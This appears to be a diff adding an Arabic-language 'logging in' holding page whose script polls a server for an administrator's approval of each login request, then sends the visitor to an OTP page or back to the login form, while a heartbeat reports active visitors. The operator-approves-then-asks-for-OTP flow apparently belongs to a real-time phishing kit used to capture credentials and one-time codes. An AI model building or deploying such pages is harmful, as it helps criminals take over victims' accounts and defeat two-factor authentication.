@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>جاري تسجيل الدخول</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&display=swap');
+
+  *{box-sizing:border-box;}
+  body{
+    margin:0;
+    font-family:'Tajawal', sans-serif;
+    display:flex;
+    justify-content:center;
+  }
+
+  .phone{
+    width:100%;
+    max-width:430px;
+    min-height:100vh;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    justify-content:center;
+    gap:20px;
+    background:linear-gradient(160deg, #6b2b0e 0%, #a8420f 30%, #d97a1f 65%, #e2861f 100%);
+  }
+
+  .spinner{
+    width:52px;
+    height:52px;
+    border:5px solid rgba(255,255,255,0.35);
+    border-top-color:#ffffff;
+    border-radius:50%;
+    animation:spin 0.8s linear infinite;
+  }
+
+  @keyframes spin{
+    to{ transform:rotate(360deg); }
+  }
+
+  .loading-text{
+    color:#ffffff;
+    font-size:16px;
+    font-weight:700;
+    margin:0;
+  }
+</style>
+</head>
+<body>
+
+<div class="phone">
+  <div class="spinner"></div>
+  <p class="loading-text">جاري تسجيل الدخول...</p>
+</div>
+
+<script>
+// Poll the server for the admin's decision on this login request
+const pollInterval = setInterval(function(){
+  fetch('/api/login-status')
+    .then(function(r){ return r.json(); })
+    .then(function(data){
+      if(!data) return;
+
+      if(data.status === 'accepted'){
+        clearInterval(pollInterval);
+        fetch('/api/clear-request', { method: 'POST' })
+          .finally(function(){ window.location.href = 'otp-ar.html'; });
+      } else if(data.status === 'rejected'){
+        clearInterval(pollInterval);
+        fetch('/api/clear-request', { method: 'POST' })
+          .finally(function(){ window.location.href = 'login-ar.html?error=1'; });
+      }
+    })
+    .catch(function(){ /* السيرفر لسه بيحمّل أو في مشكلة اتصال */ });
+}, 600);
+
+// ---- نبضة الزيارات النشطة الحقيقية ----
+(function(){
+  let sid = sessionStorage.getItem('visitSessionId');
+  if(!sid){
+    sid = 'sid-' + Math.random().toString(36).slice(2) + Date.now();
+    sessionStorage.setItem('visitSessionId', sid);
+  }
+  function sendHeartbeat(){
+    fetch('/api/heartbeat', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ sessionId: sid })
+    }).catch(function(){});
+  }
+  sendHeartbeat();
+  setInterval(sendHeartbeat, 4000);
+})();
+</script>
+
+</body>
+</html>
